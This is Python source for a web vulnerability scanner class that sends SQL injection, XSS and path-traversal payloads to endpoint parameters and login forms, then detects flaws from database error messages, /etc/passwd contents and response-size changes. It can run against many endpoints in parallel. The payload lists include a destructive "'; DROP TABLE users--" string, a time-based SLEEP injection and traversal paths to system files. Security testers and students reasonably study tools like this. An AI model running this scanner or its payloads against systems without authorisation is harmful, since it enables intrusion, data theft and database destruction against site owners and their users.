#!/usr/bin/env python3
"""
Smart Payload Tester - Optimized vulnerability testing

Provides intelligent payload testing with early detection and adaptive strategies
"""

import re
import time
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

class SmartPayloadTester:
    """Smart payload testing with early detection and optimization"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        
        # Payload categories by detection speed
        self.ultra_quick_payloads = {
            'sql': ["'"],
            'xss': ['<script>'],
            'lfi': ['../../../etc/passwd']
        }
        
        self.quick_payloads = {
            'sql': ["'", '"', "' OR '1'='1"],
            'xss': ['<script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>'],
            'lfi': ['../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts']
        }
        
        self.full_payloads = {
            'sql': [
                "' OR '1'='1",
                "' AND 1=1--",
                "' UNION SELECT 1,2,3--",
                "' AND SLEEP(2)--",
                "'; DROP TABLE users--"
            ],
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")'
            ],
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '/etc/passwd',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd'
            ]
        }
        
        # Detection patterns for each vulnerability type
        self.detection_patterns = {
            'sql': [
                r'You have an error in your SQL syntax',
                r'mysql_fetch_array\(\)',
                r'PostgreSQL query failed',
                r'ORA-\d{5}',
                r'Microsoft.*ODBC.*SQL Server.*Driver',
                r'SQLite.*error',
                r'SQL syntax.*error',
                r'syntax error at or near',
                r'quoted string not properly terminated'
            ],
            'xss': [
                r'<script[^>]*>.*?</script>',
                r'<img[^>]*onerror[^>]*>',
                r'javascript:',
                r'<svg[^>]*onload[^>]*>'
            ],
            'lfi': [
                r'root:.*?:0:0:',
                r'\[boot loader\]',
                r'\[operating systems\]',
                r'# /etc/passwd',
                r'daemon:.*?:/usr/sbin/nologin'
            ]
        }
    
    def test_endpoint_smart(self, endpoint, parameters, vuln_type='sql'):
        """Smart testing with early detection and parallel processing"""
        results = []
        
        # Get baseline response
        baseline_response = self.scanner.make_request(endpoint)
        if not baseline_response:
            return results
        
        # Test each parameter
        for param in parameters:
            vuln_result = self._test_parameter_smart(endpoint, param, baseline_response, vuln_type)
            if vuln_result:
                results.append(vuln_result)
        
        return results
    
    def _test_parameter_smart(self, endpoint, param, baseline_response, vuln_type):
        """Smart parameter testing with progressive payload complexity"""
        
        # Phase 1: Ultra-quick detection
        if self._quick_vulnerability_check(endpoint, param, baseline_response, vuln_type, 'ultra_quick'):
            # Phase 2: Quick confirmation
            if self._quick_vulnerability_check(endpoint, param, baseline_response, vuln_type, 'quick'):
                # Phase 3: Detailed testing
                return self._detailed_vulnerability_test(endpoint, param, baseline_response, vuln_type)
        
        return None
    
    def _quick_vulnerability_check(self, endpoint, param, baseline_response, vuln_type, phase):
        """Quick vulnerability check with minimal payloads"""
        
        if phase == 'ultra_quick':
            payloads = self.ultra_quick_payloads.get(vuln_type, [])
        else:
            payloads = self.quick_payloads.get(vuln_type, [])
        
        for payload in payloads:
            test_url = f"{endpoint}?{param}={quote(payload)}"
            response = self.scanner.make_request(test_url)
            
            if response and self._detect_vulnerability(response, baseline_response, payload, vuln_type):
                return True
        
        return False
    
    def _detailed_vulnerability_test(self, endpoint, param, baseline_response, vuln_type):
        """Detailed vulnerability testing with full payload set"""
        
        payloads = self.full_payloads.get(vuln_type, [])
        
        for payload in payloads:
            # Test GET parameters
            test_url = f"{endpoint}?{param}={quote(payload)}"
            response = self.scanner.make_request(test_url)
            
            if response and self._detect_vulnerability(response, baseline_response, payload, vuln_type):
                return {
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'url': test_url,
                    'method': 'GET',
                    'severity': self._get_severity(vuln_type, payload),
                    'description': f'{vuln_type.upper()} vulnerability in {param} parameter',
                    'evidence': self._extract_evidence(response.text, payload, vuln_type)
                }
            
            # Test POST for login endpoints
            if '/login' in endpoint or '/session' in endpoint:
                post_data = {param: payload}
                if param == 'username':
                    post_data['password'] = 'test'
                
                response = self.scanner.make_request(endpoint, method='POST', data=post_data)
                
                if response and self._detect_vulnerability(response, baseline_response, payload, vuln_type):
                    return {
                        'endpoint': endpoint,
                        'parameter': param,
                        'payload': payload,
                        'url': endpoint,
                        'method': 'POST',
                        'severity': self._get_severity(vuln_type, payload),
                        'description': f'{vuln_type.upper()} vulnerability in {param} parameter (POST)',
                        'evidence': self._extract_evidence(response.text, payload, vuln_type)
                    }
        
        return None
    
    def _detect_vulnerability(self, response, baseline_response, payload, vuln_type):
        """Detect vulnerability using pattern matching and response analysis"""
        
        if not response or not baseline_response:
            return False
        
        response_text = response.text
        baseline_text = baseline_response.text
        
        # Check for specific error patterns
        patterns = self.detection_patterns.get(vuln_type, [])
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Ensure this pattern doesn't exist in baseline
                if not re.search(pattern, baseline_text, re.IGNORECASE):
                    return True
        
        # Check for significant response differences
        if self._analyze_response_differences(response, baseline_response, vuln_type):
            return True
        
        return False
    
    def _analyze_response_differences(self, response, baseline_response, vuln_type):
        """Analyze response differences for vulnerability indicators"""
        
        # Status code differences
        if response.status_code != baseline_response.status_code:
            if response.status_code == 500 and baseline_response.status_code != 500:
                return True
        
        # Response length differences
        response_length = len(response.text)
        baseline_length = len(baseline_response.text)
        
        if baseline_length > 0:
            length_diff_ratio = abs(response_length - baseline_length) / baseline_length
            
            # Different thresholds for different vulnerability types
            threshold = {
                'sql': 0.3,
                'xss': 0.1,
                'lfi': 0.5
            }.get(vuln_type, 0.3)
            
            if length_diff_ratio > threshold:
                return True
        
        return False
    
    def _get_severity(self, vuln_type, payload):
        """Determine vulnerability severity based on type and payload"""
        
        high_risk_patterns = {
            'sql': ['DROP', 'DELETE', 'UPDATE', 'INSERT'],
            'xss': ['script', 'onerror', 'onload'],
            'lfi': ['etc/passwd', 'system32']
        }
        
        patterns = high_risk_patterns.get(vuln_type, [])
        for pattern in patterns:
            if pattern.lower() in payload.lower():
                return 'high'
        
        return 'medium'
    
    def _extract_evidence(self, response_text, payload, vuln_type):
        """Extract evidence of vulnerability from response"""
        
        patterns = self.detection_patterns.get(vuln_type, [])
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                # Return context around the match
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 50)
                return response_text[start:end].strip()
        
        # If no specific pattern found, return payload reflection
        if payload in response_text:
            payload_index = response_text.find(payload)
            start = max(0, payload_index - 30)
            end = min(len(response_text), payload_index + len(payload) + 30)
            return response_text[start:end].strip()
        
        return "Vulnerability detected through response analysis"
    
    def test_multiple_endpoints_parallel(self, endpoints_params, vuln_type='sql', max_workers=10):
        """Test multiple endpoints in parallel for better performance"""
        
        results = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_endpoint = {}
            for endpoint, params in endpoints_params.items():
                future = executor.submit(self.test_endpoint_smart, endpoint, params, vuln_type)
                future_to_endpoint[future] = endpoint
            
            # Collect results as they complete
            for future in as_completed(future_to_endpoint):
                endpoint = future_to_endpoint[future]
                try:
                    endpoint_results = future.result()
                    results.extend(endpoint_results)
                except Exception as e:
                    self.scanner.log(f"Error testing {endpoint}: {e}", 'debug')
        
        return results